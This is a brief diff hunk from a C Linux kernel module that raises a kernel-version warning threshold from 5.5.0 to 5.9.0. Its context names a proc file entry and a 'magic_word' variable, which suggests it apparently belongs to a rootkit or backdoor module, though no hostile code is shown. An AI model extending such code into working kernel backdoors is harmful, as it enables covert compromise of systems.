@@ -44,7 +44,7 @@ static struct proc_dir_entry *ntshProcFileEntry;
 struct __lkmmod_t{ struct module *this_mod; };
 static char *magic_word;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,5,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,9,0)
 #pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
 #endif
 
